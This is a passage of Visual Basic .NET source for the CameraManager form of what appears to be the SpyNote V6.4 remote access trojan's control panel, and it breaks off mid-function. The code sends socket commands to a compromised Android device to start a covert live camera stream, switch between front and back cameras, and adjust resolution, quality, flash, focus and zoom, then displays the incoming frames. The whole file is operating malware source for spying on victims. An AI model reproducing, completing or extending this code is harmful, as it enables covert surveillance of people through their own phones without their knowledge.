Imports Microsoft.VisualBasic.CompilerServices
Imports System.ComponentModel
Imports System.Runtime.CompilerServices
Imports SpyNote_V6._4.SN.SpyNote.Stores
Imports SpyNote_V6._4.SN
Imports SpyNote_V6._4.SN.Sockets.SpyNote.Client
Imports System.Drawing.Drawing2D

Public Class CameraManager
    Public TClient As SocketClient

    Public MClient As SocketClient

    Public Packet As Long

    Public PreView As Integer

    Public FPS As Integer

    Public Lng As String

    Public TempImage As PictureBox

    Public NumRotate As Integer

    Private lock As Boolean

    Private DefProperties As Boolean

    Private go As Boolean

    Private vul As Integer

    Private mPoint As Point

    Public StrText0 As String

    Public StrText1 As String

    Public StrText2 As String

    Private Doyouwrite As Boolean

    Private Counter0 As Integer

    Private Counter1 As Integer

    Private Counter2 As Integer

    Private int As Integer

    Private vulZoom As Integer

    Private maxZoom As Integer

    Private boZoom As Boolean

    Private clrSplit As Color

    Private BOL As Boolean
    Public Sub New()
        Me.Packet = CLng(0)
        Me.PreView = 0
        Me.FPS = 0
        Me.Lng = "0 b"
        Me.TempImage = New PictureBox()
        Me.NumRotate = 1
        Me.vul = -1
        Me.Doyouwrite = False
        Me.boZoom = False
        Me.clrSplit = Color.FromArgb(255, 63, 63, 70)
        Me.InitializeComponent()
    End Sub
    Private Function aArrow() As Boolean
        Me.vul += 1
        Dim num As Integer = Me.vul
        Dim flag As Boolean = num > 60
        Dim result As Boolean
        If flag Then
            Me.vul = -1
            result = False
        Else
            flag = (num >= 0 AndAlso num <= 30)
            If flag Then
                result = True
            Else
                flag = (num >= 31 AndAlso num <= 60)
                result = (flag AndAlso False)
            End If
        End If
        Return result
    End Function
    Private Sub BTNFLASH_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BTNFLASH.Click
        If (Not Operators.ConditionalCompareObjectEqual(Me.BTNFLASH.Tag, "0", False)) Then
            Me.BTNFLASH.Tag = "0"
            Me.BTNFLASH.backColorNone0 = Color.FromArgb(45, 45, 48)
            Me.BTNFLASH.backColorNone1 = Color.FromArgb(45, 45, 48)
            Me.LBFLMO.Text = "Flash Mode:Off"
        Else
            Me.BTNFLASH.Tag = "1"
            Me.BTNFLASH.backColorNone0 = Color.FromArgb(78, 201, 148)
            Me.BTNFLASH.backColorNone1 = Color.FromArgb(78, 201, 148)
            Me.LBFLMO.Text = "Flash Mode:On"
        End If
        Me.SetParameters()
    End Sub

    Private Sub BTNFocus_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BTNFocus.Click
        If (Not Operators.ConditionalCompareObjectEqual(Me.BTNFocus.Tag, "0", False)) Then
            Me.BTNFocus.Tag = "0"
            Me.BTNFocus.backColorNone0 = Color.FromArgb(45, 45, 48)
            Me.BTNFocus.backColorNone1 = Color.FromArgb(45, 45, 48)
            Me.LBFOC.Text = "Foces:Off"
        Else
            Me.BTNFocus.Tag = "1"
            Me.BTNFocus.backColorNone0 = Color.FromArgb(78, 201, 148)
            Me.BTNFocus.backColorNone1 = Color.FromArgb(78, 201, 148)
            Me.LBFOC.Text = "Foces:On"
        End If
        Me.SetParameters()
    End Sub

    Private Sub BTNMIN_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BTNMIN.Click
        Me.CameraZoom(False)
    End Sub

    Private Sub BTNMUSht_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BTNMUSht.Click
        If (Not Operators.ConditionalCompareObjectEqual(Me.BTNMUSht.Tag, "0", False)) Then
            Me.BTNMUSht.Tag = "0"
            Me.BTNMUSht.backColorNone0 = Color.FromArgb(45, 45, 48)
            Me.BTNMUSht.backColorNone1 = Color.FromArgb(45, 45, 48)
            Me.LABMUSH.Text = "Multi-Capture:Off"
        Else
            Me.BTNMUSht.Tag = "1"
            Me.BTNMUSht.backColorNone0 = Color.FromArgb(78, 201, 148)
            Me.BTNMUSht.backColorNone1 = Color.FromArgb(78, 201, 148)
            Me.LABMUSH.Text = "Multi-Captures:On"
        End If
    End Sub

    Private Sub BTNZay_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BTNZay.Click
        Me.CameraZoom(True)
    End Sub

    Private Sub Camera_Closing(ByVal sender As Object, ByVal e As CancelEventArgs) Handles Me.Closing
        Me.TClient.Send(Store.BFF(Store.buff, CLng(12)))
    End Sub

    Private Sub Camera_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        Dim obj As Object
        MyBase.Icon = New System.Drawing.Icon(String.Concat(Store.Resources(1), "\Icons\window\win\12.ico"))
        Me.SELCTE_SZ.Renderer = New ThemeToolStripCmbx()
        Me.SELCT_CAM.Renderer = New ThemeToolStripCmbx()
        Me.SELCT_QUA.Renderer = New ThemeToolStripCmbx()
        Me.BTNFLASH.ImageChoice = Store.Bitmap_0("Camera\Flash")
        Me.BTNFLASH.ShowImage = True
        Me.BTNFocus.ImageChoice = Store.Bitmap_0("Camera\Foces")
        Me.BTNFocus.ShowImage = True
        Me.BTNZay.ImageChoice = Store.Bitmap_0("Camera\Zoom1")
        Me.BTNZay.ShowImage = True
        Me.BTNMIN.ImageChoice = Store.Bitmap_0("Camera\Zoom0")
        Me.BTNMIN.ShowImage = True
        Me.BTNMUSht.ImageChoice = Store.Bitmap_0("Camera\Multi-Capture")
        Me.BTNMUSht.ShowImage = True
        Me.mPoint = New Point(30, 30)
        Dim num As Integer = 1
        Do
            Dim num1 As Integer = num * 10
            Dim toolStripMenuItem As System.Windows.Forms.ToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
            Dim str As System.Windows.Forms.ToolStripMenuItem = toolStripMenuItem
            If (num1 = 80) Then
                obj = "Auto"
            Else
                obj = num1
            End If
            str.Text = Conversions.ToString(obj)
            toolStripMenuItem.Name = String.Concat("m_item", Conversions.ToString(Me.SELCT_QUA.Items.Count))
            toolStripMenuItem.Tag = Conversions.ToString(If(num1 = 80, 71, num1))
            toolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
            Dim toolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem = toolStripMenuItem
            AddHandler toolStripMenuItem1.Click, New EventHandler(AddressOf Me.SELCTQUA)
            Me.SELCT_QUA.Items.Add(toolStripMenuItem1)
            num = num + 1
        Loop While num <= 8
        Me.TProgressBar.Interval = Store.TProgressBarInterval
        Me.Trans.Interval = Store.transparency
        Me.Trans.Enabled = True
    End Sub

    Private Sub CameraManager_LocationChanged(ByVal sender As Object, ByVal e As EventArgs) Handles Me.LocationChanged
        Me.Panel1.Invalidate()
    End Sub

    Private Sub CameraManager_Resize(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Resize
        Me.Panel1.Invalidate()
    End Sub

    Private Sub CameraManager_SizeChanged(ByVal sender As Object, ByVal e As EventArgs) Handles Me.SizeChanged
        If (MyBase.WindowState = FormWindowState.Maximized) Then
            If (Me.BOL) Then
                Me.SetParameters()
                Me.BOL = False
            End If
        ElseIf (MyBase.WindowState = FormWindowState.Minimized) Then
            If (Not Me.BOL) Then
                Me.SetParameters()
                Me.BOL = True
            End If
        ElseIf (MyBase.WindowState = FormWindowState.Normal) Then
            If (Me.BOL) Then
                Me.SetParameters()
                Me.BOL = False
            End If
        End If
    End Sub
    Private Sub CameraZoom(b As Boolean)
        Dim enabled As Boolean = Me.TZoom.Enabled
        If enabled Then
            Me.TZoom.Enabled = False
        End If
        If b Then
            Me.vulZoom += 5
        Else
            Me.vulZoom -= 5
        End If
        Dim num As Integer = Me.vulZoom
        Dim flag As Boolean = num >= Me.maxZoom
        If flag Then
            Me.vulZoom = Me.maxZoom
        Else
            flag = (num <= -1)
            If flag Then
                Me.vulZoom = 0
            End If
        End If
        Me.boZoom = True
        Me.SetParameters()
        Me.LBLZOOM.Text = "ZOOM:" + Conversions.ToString(Store.RateConverter(Me.vulZoom, Me.maxZoom)) + "%"
        Dim flag2 As Boolean = Not Me.TZoom.Enabled
        If flag2 Then
            Me.TZoom.Enabled = True
        End If
        Me.Panel1.Invalidate()
    End Sub
    Private Sub LBER_Click(ByVal sender As Object, ByVal e As EventArgs) Handles LBER.Click
        Me.PNLERRORS.Visible = False
    End Sub

    Private Sub Panel1_Paint(ByVal sender As Object, ByVal e As PaintEventArgs) Handles Panel1.Paint
        ControlPaint.DrawBorder(e.Graphics, e.ClipRectangle, Me.clrSplit, ButtonBorderStyle.Dashed)
    End Sub

    Private Sub PBox_Click(ByVal sender As Object, ByVal e As EventArgs) Handles PBox.Click
        Me.PBox.Focus()
    End Sub

    Private Sub PBox_KeyDown(ByVal sender As Object, ByVal e As KeyEventArgs) Handles PBox.KeyDown
        If (e.KeyCode = Keys.H) Then
            Me.Panel1.Visible = False
        ElseIf (e.KeyCode = Keys.S) Then
            Me.Panel1.Visible = True
        End If
    End Sub
    Private Sub PBox_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles PBox.MouseDoubleClick
        Dim flag As Boolean = Me.TempImage.Image IsNot Nothing
        If flag Then
            Dim flag2 As Boolean = Me.PBox.Image IsNot Nothing
            If flag2 Then
                Me.NumRotate += 1
                Me.RotateFlip(Me.NumRotate)
            End If
        End If
    End Sub
    Private Sub PBox_MouseMove(ByVal sender As Object, ByVal e As MouseEventArgs) Handles PBox.MouseMove
        Me.mPoint = e.Location
    End Sub

    Private Sub PBox_MouseWheel(ByVal sender As Object, ByVal e As MouseEventArgs) Handles PBox.MouseWheel
        If (e.Delta <= 0) Then
            Me.CameraZoom(False)
        Else
            Me.CameraZoom(True)
        End If
    End Sub
    Private Sub PBox_Paint(sender As Object, e As PaintEventArgs) Handles PBox.Paint
        Try
            Dim flag As Boolean = Me.PBox.Image IsNot Nothing
            If flag Then
                Dim font As Font = New Font("Consolas", 8.25F, FontStyle.Bold)
                Dim font2 As Font = New Font("Consolas", 10.25F, FontStyle.Bold)
                Dim text As String = Conversions.ToString(Me.FPS) + "fps" & vbCrLf + If((Me.FPS = 0), "0 b", Me.Lng)
                Dim flag2 As Boolean = Me.FPS > 0
                If flag2 Then
                    Dim flag3 As Boolean = Not Me.go
                    If flag3 Then
                        Me.go = True
                    End If
                End If
                Dim size As Size = TextRenderer.MeasureText(text, font)
                Dim flag4 As Boolean = Me.mPoint.X < size.Width And Me.mPoint.Y > Me.PBox.Size.Height - 50
                If Not flag4 Then
                    Dim rect As Rectangle = New Rectangle(5, Me.PBox.Size.Height - 50, size.Width, size.Height)
                    e.Graphics.FillRectangle(New Pen(Color.FromArgb(150, 5, 5, 5)).Brush, rect)
                    Dim brush As Brush = New SolidBrush(Color.FromArgb(170, 170, 170))
                    Dim fps As Integer = Me.FPS
                    Dim flag5 As Boolean = fps <= 0
                    If flag5 Then
                        brush = New SolidBrush(Color.FromArgb(170, 170, 170))
                    Else
                        flag5 = (fps >= 1 AndAlso fps <= 2)
                        If flag5 Then
                            brush = New SolidBrush(Color.FromArgb(255, 128, 128))
                        Else
                            flag5 = (fps >= 3 AndAlso fps <= 5)
                            If flag5 Then
                                brush = New SolidBrush(Color.FromArgb(255, 192, 128))
                            Else
                                flag5 = (fps >= 6 AndAlso fps <= 9)
                                If flag5 Then
                                    brush = New SolidBrush(Color.FromArgb(0, 192, 0))
                                Else
                                    flag5 = (fps >= 10)
                                    If flag5 Then
                                        brush = New SolidBrush(Color.FromArgb(128, 255, 128))
                                    Else
                                        brush = New SolidBrush(Color.FromArgb(170, 170, 170))
                                    End If
                                End If
                            End If
                        End If
                    End If
                    e.Graphics.DrawString(text, font, brush, 5.0F, CSng((Me.PBox.Size.Height - 50)))
                End If
                Dim flag6 As Boolean = Me.boZoom
                If flag6 Then
                    Dim white As Brush = Brushes.White
                    Dim totalsize As Integer = Me.maxZoom
                    Dim value As Integer = Me.vulZoom
                    Dim value2 As Integer = Store.RateConverter(value, totalsize)
                    Dim x As Integer = CInt(Math.Round(CDbl(Me.PBox.Size.Width) / 2.0))
                    Dim y As Integer = CInt(Math.Round(CDbl(Me.PBox.Size.Height) / 2.0))
                    e.Graphics.SmoothingMode = SmoothingMode.AntiAlias
                    Dim text2 As String = Conversions.ToString(value2) + "%"
                    Dim size2 As Size = TextRenderer.MeasureText(text2, font2)
                    Dim rect2 As Rectangle = New Rectangle(x, y, size2.Width, size2.Height)
                    e.Graphics.FillRectangle(New Pen(Color.FromArgb(150, 5, 5, 5)).Brush, rect2)
                    e.Graphics.DrawString(text2, font2, white, CSng((CDbl(Me.PBox.Size.Width) / 2.0)), CSng((CDbl(Me.PBox.Size.Height) / 2.0)))
                End If
            End If
            Try
                Dim doyouwrite As Boolean = Me.Doyouwrite
                If doyouwrite Then
                    Dim rect3 As Rectangle = New Rectangle(0, 0, MyBase.Size.Width, MyBase.Size.Height)
                    e.Graphics.FillRectangle(New Pen(Color.FromArgb(180, 28, 28, 28)).Brush, rect3)
                    Dim white2 As Brush = Brushes.White
                    Dim font3 As Font = New Font("Consolas", 8.25F, FontStyle.Bold)
                    Dim flag7 As Boolean = Me.StrText0 <> Nothing
                    If flag7 Then
                        Dim num As Integer = Me.StrText0.Length - 1
                        Dim flag8 As Boolean = Me.Counter0 <= num
                        If flag8 Then
                            Me.Counter0 += 1
                            e.Graphics.DrawString(Me.StrText0.Substring(0, Me.Counter0), font3, white2, 0F, 0F)
                            Dim size3 As Size = TextRenderer.MeasureText(Me.StrText0.Substring(0, Me.Counter0), font3)
                            e.Graphics.DrawLine(New Pen(Color.White, 5.0F), size3.Width + 8, 0, size3.Width + 8, 15)
                        Else
                            e.Graphics.DrawString(Me.StrText0.Substring(0, Me.Counter0), font3, white2, 0F, 0F)
                            Dim flag9 As Boolean = Me.StrText1 = Nothing
                            If flag9 Then
                                Dim flag10 As Boolean = Me.aArrow()
                                If flag10 Then
                                    Dim size4 As Size = TextRenderer.MeasureText(Me.StrText0.Substring(0, Me.Counter0), font3)
                                    e.Graphics.DrawLine(New Pen(Color.White, 5.0F), size4.Width + 8, 0, size4.Width + 8, 15)
                                End If
                            End If
                            Dim flag11 As Boolean = Me.StrText1 <> Nothing
                            If flag11 Then
                                Dim num2 As Integer = Me.StrText1.Length - 1
                                Dim flag12 As Boolean = Me.Counter1 <= num2
                                If flag12 Then
                                    Me.Counter1 += 1
                                    e.Graphics.DrawString(Me.StrText1.Substring(0, Me.Counter1), font3, white2, 0F, 13.0F)
                                    Dim size5 As Size = TextRenderer.MeasureText(Me.StrText1.Substring(0, Me.Counter1), font3)
                                    e.Graphics.DrawLine(New Pen(Color.White, 5.0F), size5.Width + 8, 13, size5.Width + 8, 28)
                                Else
                                    e.Graphics.DrawString(Me.StrText1.Substring(0, Me.Counter1), font3, white2, 0F, 13.0F)
                                    Dim flag13 As Boolean = Me.StrText2 = Nothing
                                    If flag13 Then
                                        Dim flag14 As Boolean = Me.aArrow()
                                        If flag14 Then
                                            Dim size6 As Size = TextRenderer.MeasureText(Me.StrText1.Substring(0, Me.Counter1), font3)
                                            e.Graphics.DrawLine(New Pen(Color.White, 5.0F), size6.Width + 8, 13, size6.Width + 8, 28)
                                        End If
                                    End If
                                    Dim flag15 As Boolean = Me.StrText2 <> Nothing
                                    If flag15 Then
                                        Dim num3 As Integer = Me.StrText2.Length - 1
                                        Dim flag16 As Boolean = Me.Counter2 <= num3
                                        If Not flag16 Then
                                            e.Graphics.DrawString(Me.StrText2.Substring(0, Me.Counter2), font3, white2, 0F, 26.0F)
                                            Dim flag17 As Boolean = Me.StrText2 <> Nothing
                                            If flag17 Then
                                                Dim flag18 As Boolean = Me.aArrow()
                                                If flag18 Then
                                                    Dim size7 As Size = TextRenderer.MeasureText(Me.StrText2.Substring(0, Me.Counter2), font3)
                                                    e.Graphics.DrawLine(New Pen(Color.White, 5.0F), size7.Width + 8, 26, size7.Width + 8, 41)
                                                End If
                                            End If
                                            Me.Doyouwrite = False
                                            Me.RF.Enabled = False
                                            GoTo IL_A88
                                        End If
                                        Me.Counter2 += 1
                                        e.Graphics.DrawString(Me.StrText2.Substring(0, Me.Counter2), font3, white2, 0F, 26.0F)
                                        Dim size8 As Size = TextRenderer.MeasureText(Me.StrText2.Substring(0, Me.Counter2), font3)
                                        e.Graphics.DrawLine(New Pen(Color.White, 5.0F), size8.Width + 8, 26, size8.Width + 8, 41)
                                    End If
                                End If
                            End If
                        End If
                    End If
                End If
            Catch ex As Exception
            End Try
            Dim flag19 As Boolean = Conversions.ToBoolean(Operators.AndObject(Operators.AndObject(Operators.AndObject(Not Me.Doyouwrite And Me.FPS = 0, Operators.CompareObjectEqual(Me.STALAB.Tag, "1", False)), Me.go), Me.PBox.Image IsNot Nothing))
            If flag19 Then
                Dim flag20 As Boolean = Me.int > 15
                If flag20 Then
                    Dim rect4 As Rectangle = New Rectangle(0, 0, MyBase.Size.Width, MyBase.Size.Height)
                    e.Graphics.FillRectangle(New Pen(Color.FromArgb(180, 28, 28, 28)).Brush, rect4)
                    Dim num4 As Integer = CInt(Math.Round(CDbl(Me.PBox.Size.Width) / 2.0))
                    Dim num5 As Integer = CInt(Math.Round(CDbl(Me.PBox.Size.Height) / 2.0))
                    e.Graphics.SmoothingMode = SmoothingMode.AntiAlias
                    Dim text3 As String = "live stream will be back soon ..."
                    Dim font4 As Font = New Font("Consolas", 10.25F, FontStyle.Bold)
                    Dim size9 As Size = TextRenderer.MeasureText(text3, font4)
                    Dim num6 As Integer = CInt(Math.Round(CDbl(size9.Width) / 2.0))
                    num4 -= num6
                    Dim rect5 As Rectangle = New Rectangle(num4, num5, size9.Width, size9.Height)
                    e.Graphics.FillRectangle(New Pen(Color.FromArgb(150, 5, 5, 5)).Brush, rect5)
                    Dim brush2 As Brush = New SolidBrush(Color.FromArgb(170, 170, 170))
                    e.Graphics.DrawString(text3, font4, brush2, CSng(num4), CSng(num5))
                Else
                    Me.int += 1
                End If
            Else
                Me.int = 0
            End If
IL_A88:
        Catch ex2 As Exception
        End Try
    End Sub
    Private Sub QUALAB_Click_1(ByVal sender As Object, ByVal e As EventArgs) Handles QUALAB.Click
        If (Me.SELCT_CAM.Items.Count <> 0 And Me.SELCTE_SZ.Items.Count <> 0) Then
            Me.SELCT_QUA.Width = Me.QUALAB.Width
            Me.SELCT_QUA.Height = Me.SELCT_QUA.PreferredSize.Height
            Dim screen As System.Drawing.Point = Me.QUALAB.PointToScreen(New System.Drawing.Point(0, 0))
            Dim point As System.Drawing.Point = New System.Drawing.Point(screen.X, screen.Y + Me.QUALAB.Height)
            Me.SELCT_QUA.Show(point)
        End If
    End Sub

    Private Sub RF_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles RF.Tick
        Me.PBox.Invalidate()
    End Sub

    Public Sub RotateFlip(ByVal vul As Integer)
        Try
            Select Case vul
                Case 2
                    Me.TempImage.Image.RotateFlip(RotateFlipType.Rotate270FlipNone)
                    Exit Select
                Case 3
                    Me.TempImage.Image.RotateFlip(RotateFlipType.Rotate270FlipNone)
                    Exit Select
                Case 4
                    Me.TempImage.Image.RotateFlip(RotateFlipType.Rotate270FlipNone)
                    Exit Select
                Case 5
                    Me.TempImage.Image.RotateFlip(RotateFlipType.Rotate270FlipNone)
                    Me.NumRotate = 1
                    Exit Select
            End Select
            Me.TempImage.Refresh()
            Me.PBox.Image = Me.TempImage.Image
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub SELCAM(ByVal sender As Object, ByVal e As EventArgs)
        Try
            Dim tag As String = CStr(TryCast(sender, ToolStripMenuItem).Tag)
            If (Operators.CompareString(tag, Nothing, False) <> 0) Then
                Me.SelCamera.Tag = tag
                Me.SelCamera.TxText = String.Concat("Select Camera:", tag)
                Me.SelCamera.Refresh()
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub SelCamera_Click(ByVal sender As Object, ByVal e As EventArgs) Handles SelCamera.Click
        If (Me.SELCT_CAM.Items.Count > 0) Then
            Me.SELCT_CAM.Width = Me.SelCamera.Width
            Me.SELCT_CAM.Height = Me.SELCT_CAM.PreferredSize.Height
            Dim screen As System.Drawing.Point = Me.SelCamera.PointToScreen(New System.Drawing.Point(0, 0))
            Dim point As System.Drawing.Point = New System.Drawing.Point(screen.X, screen.Y + Me.SelCamera.Height)
            Me.SELCT_CAM.Show(point)
        End If
    End Sub

    Private Sub SELCT_CAM_Closing(ByVal sender As Object, ByVal e As ToolStripDropDownClosingEventArgs) Handles SELCT_CAM.Closing
        Me.SelCamera.BordColor = Color.FromArgb(67, 67, 70)
        Me.SelCamera.MyArrwColorNone = Color.FromArgb(153, 153, 153)
        Me.SelCamera.MylinColorNone = Color.FromArgb(67, 67, 70)
        Me.SelCamera.Refresh()
        Me.Panel1.Invalidate()
    End Sub

    Private Sub SELCT_CAM_Opening(ByVal sender As Object, ByVal e As CancelEventArgs) Handles SELCT_CAM.Opening
        Me.SelCamera.BordColor = Color.FromArgb(32, 146, 255)
        Me.SelCamera.MyArrwColorNone = Color.FromArgb(32, 146, 255)
        Me.SelCamera.MylinColorNone = Color.FromArgb(32, 146, 255)
        Me.SelCamera.Refresh()
    End Sub

    Private Sub SELCT_QUA_Closing(ByVal sender As Object, ByVal e As ToolStripDropDownClosingEventArgs) Handles SELCT_QUA.Closing
        Me.QUALAB.BordColor = Color.FromArgb(67, 67, 70)
        Me.QUALAB.MyArrwColorNone = Color.FromArgb(153, 153, 153)
        Me.QUALAB.MylinColorNone = Color.FromArgb(67, 67, 70)
        Me.QUALAB.Refresh()
        Me.Panel1.Invalidate()
    End Sub

    Private Sub SELCT_QUA_Opening(ByVal sender As Object, ByVal e As CancelEventArgs) Handles SELCT_QUA.Opening
        Me.QUALAB.BordColor = Color.FromArgb(32, 146, 255)
        Me.QUALAB.MyArrwColorNone = Color.FromArgb(32, 146, 255)
        Me.QUALAB.MylinColorNone = Color.FromArgb(32, 146, 255)
        Me.QUALAB.Refresh()
    End Sub

    Private Sub SELCTE_SZ_Closing(ByVal sender As Object, ByVal e As ToolStripDropDownClosingEventArgs) Handles SELCTE_SZ.Closing
        Me.SIZLAB.BordColor = Color.FromArgb(67, 67, 70)
        Me.SIZLAB.MyArrwColorNone = Color.FromArgb(153, 153, 153)
        Me.SIZLAB.MylinColorNone = Color.FromArgb(67, 67, 70)
        Me.SIZLAB.Refresh()
        Me.Panel1.Invalidate()
    End Sub

    Private Sub SELCTE_SZ_Opening(ByVal sender As Object, ByVal e As CancelEventArgs) Handles SELCTE_SZ.Opening
        Me.SIZLAB.BordColor = Color.FromArgb(32, 146, 255)
        Me.SIZLAB.MyArrwColorNone = Color.FromArgb(32, 146, 255)
        Me.SIZLAB.MylinColorNone = Color.FromArgb(32, 146, 255)
        Me.SIZLAB.Refresh()
    End Sub

    Private Sub SELCTQUA(ByVal sender As Object, ByVal e As EventArgs)
        Try
            Dim tag As String = CStr(TryCast(sender, ToolStripMenuItem).Tag)
            If (Operators.CompareString(tag, Nothing, False) <> 0) Then
                Me.QUALAB.Tag = tag
                Me.QUALAB.TxText = String.Concat("Quality:", If(Operators.CompareString(tag, "71", False) = 0, "Auto", tag))
                Me.QUALAB.Refresh()
                Me.SetParameters()
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub SELSZ(ByVal sender As Object, ByVal e As EventArgs)
        Try
            Dim tag As String = CStr(TryCast(sender, ToolStripMenuItem).Tag)
            If (Operators.CompareString(tag, Nothing, False) <> 0) Then
                Me.SIZLAB.Tag = tag
                Me.SIZLAB.TxText = String.Concat("Size:", tag)
                Me.SIZLAB.Refresh()
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub SetParameters()
        Dim strArrays As String() = CStr(Me.SIZLAB.Tag).Split(New String() {"*"}, StringSplitOptions.RemoveEmptyEntries)
        If (CInt(strArrays.Length) > 1) Then
            Dim tClient As SocketClient = Me.TClient
            Dim strArrays1() As String = {Store.BFF(Store.buff, CLng(13)), Data.SplitData, CStr(Me.SelCamera.Tag), Data.SplitData, strArrays(0), Data.SplitData, strArrays(1), Data.SplitData, CStr(Me.QUALAB.Tag), Data.SplitData, Conversions.ToString(Me.BTNFLASH.Tag), Data.SplitData, Conversions.ToString(Me.BTNFocus.Tag), Data.SplitData, Conversions.ToString(Me.vulZoom), Data.SplitData, Nothing}
            strArrays1(16) = If(MyBase.WindowState = FormWindowState.Minimized, Conversions.ToString(-1), Conversions.ToString(1))
            tClient.Send(String.Concat(strArrays1))
        End If
    End Sub

    Private Sub SIZLAB_Click(ByVal sender As Object, ByVal e As EventArgs) Handles SIZLAB.Click
        If (Me.SELCTE_SZ.Items.Count > 0) Then
            Me.SELCTE_SZ.Width = Me.SIZLAB.Width
            Me.SELCTE_SZ.Height = Me.SELCTE_SZ.PreferredSize.Height
            Dim screen As System.Drawing.Point = Me.SIZLAB.PointToScreen(New System.Drawing.Point(0, 0))
            Dim point As System.Drawing.Point = New System.Drawing.Point(screen.X, screen.Y + Me.SIZLAB.Height)
            Me.SELCTE_SZ.Show(point)
        End If
    End Sub

    Private Sub STALAB_Click(ByVal sender As Object, ByVal e As EventArgs) Handles STALAB.Click
        Try
            If (Not Operators.ConditionalCompareObjectEqual(Me.STALAB.Tag, "-1", False)) Then
                Me.STALABSTOP()
            Else
                Me.Packet = CLng(0)
                Me.STALAB.Text = "Stop"
                Me.STALAB.Tag = "1"
                Me.StrText0 = "Please Wait..."
                Me.Doyouwrite = True
                Me.go = False
                Me.RF.Enabled = True
                Me.StartServiceCamera()
                Me.STALAB.Enabled = False
            End If
            Me.STALAB.Refresh()
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub STALABSTOP()
        Me.go = False
        Me.Doyouwrite = False
        Me.RF.Enabled = False
        Me.StrText0 = Nothing
        Me.StrText1 = Nothing
        Me.StrText2 = Nothing
        Me.Counter0 = 0
        Me.Counter1 = 0
        Me.Counter2 = 0
        Me.TClient.Send(Store.BFF(Store.buff, CLng(12)))
        Me.MClient.Close(False)
        Me.STALAB.Tag = "-1"
        Me.STALAB.Text = "Start"
        If (Not Me.STALAB.Enabled) Then
            Me.STALAB.Enabled = True
        End If
        Me.STALAB.Refresh()
    End Sub

    Public Sub StartServiceCamera()
        If (Me.Packet <> CLng(0)) Then
            Me.Packet = CLng(0)
        End If
        Dim strArrays As String() = CStr(Me.SIZLAB.Tag).Split(New String() {"*"}, StringSplitOptions.RemoveEmptyEntries)
        Dim tClient As SocketClient = Me.TClient
        Dim strArrays1() As String = {Store.BFF(Store.buff, CLng(11)), Data.SplitData, CStr(Me.SelCamera.Tag), Data.SplitData, strArrays(0), Data.SplitData, strArrays(1), Data.SplitData, CStr(Me.QUALAB.Tag), Data.SplitData, Conversions.ToString(Me.BTNFLASH.Tag), Data.SplitData, Conversions.ToString(Me.BTNFocus.Tag), Data.SplitData, Conversions.ToString(Me.vulZoom), Data.SplitData, Nothing}
        strArrays1(16) = If(MyBase.WindowState = FormWindowState.Minimized, Conversions.ToString(-1), Conversions.ToString(1))
        tClient.Send(String.Concat(strArrays1))
    End Sub

    Public Sub TData(ByVal Ay As Array)
        Dim toolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
        Dim tag As Object
        Try
            Dim value As String = CStr(Ay.GetValue(1))
            If (Operators.CompareString(value, "SpecialMessage", False) = 0) Then
                If (Operators.CompareString(CStr(Ay.GetValue(0)), ":)", False) = 0) Then
                    Me.StrText2 = "ready to Live stream"
                End If
            ElseIf (Operators.CompareString(value, Store.BFF(Store.buff, CLng(83)), False) = 0) Then
                Me.LBER.Text = CStr(Ay.GetValue(0))
                Me.PNLERRORS.Visible = True
                Me.PNLERRORS.Refresh()
                Me.STALABSTOP()
            ElseIf (Operators.CompareString(value, Store.BFF(Store.buff, CLng(84)), False) = 0) Then
                If (Not Me.lock) Then
                    Dim strArrays As String() = CStr(Ay.GetValue(0)).Split(New String() {Data.SplitLines}, StringSplitOptions.RemoveEmptyEntries)
                    Dim length As Integer = CInt(strArrays.Length) - 1
                    Dim num As Integer = 0
                    Do
                        Dim strArrays1 As String() = strArrays(num).Split(New String() {Data.SplitArray}, StringSplitOptions.RemoveEmptyEntries)
                        Dim str As String = strArrays1(0)
                        If (Operators.CompareString(str, Store.BFF(Store.buff, CLng(93)), False) = 0) Then
                            toolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem() With
                            {
                                .Text = String.Concat("Back Camera:", strArrays1(1)),
                                .Name = String.Concat("m_item", Conversions.ToString(Me.SELCT_CAM.Items.Count)),
                                .Tag = strArrays1(1),
                                .ImageScaling = ToolStripItemImageScaling.None
                            }
                            Dim toolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem = toolStripMenuItem
                            AddHandler toolStripMenuItem1.Click, New EventHandler(AddressOf Me.SELCAM)
                            Me.SELCT_CAM.Items.Add(toolStripMenuItem1)
                            If (Not Me.SelCamera.Enabled) Then
                                Me.SelCamera.Enabled = True
                            End If
                            Me.SelCamera.Tag = strArrays1(1)
                            Me.SelCamera.TxText = String.Concat("Select Camera:", CStr(Me.SelCamera.Tag))
                            Me.SelCamera.Refresh()
                        ElseIf (Operators.CompareString(str, Store.BFF(Store.buff, CLng(94)), False) = 0) Then
                            toolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem() With
                            {
                                .Text = String.Concat("Front Camera:", strArrays1(1)),
                                .Name = String.Concat("m_item", Conversions.ToString(Me.SELCT_CAM.Items.Count)),
                                .Tag = strArrays1(1),
                                .ImageScaling = ToolStripItemImageScaling.None
                            }
                            Dim toolStripMenuItem2 As System.Windows.Forms.ToolStripMenuItem = toolStripMenuItem
                            AddHandler toolStripMenuItem2.Click, New EventHandler(AddressOf Me.SELCAM)
                            Me.SELCT_CAM.Items.Add(toolStripMenuItem2)
                            If (Not Me.SelCamera.Enabled) Then
                                Me.SelCamera.Enabled = True
                            End If
                        ElseIf (Operators.CompareString(str, Store.BFF(Store.buff, CLng(95)), False) = 0) Then
                            Dim flag As Boolean = True
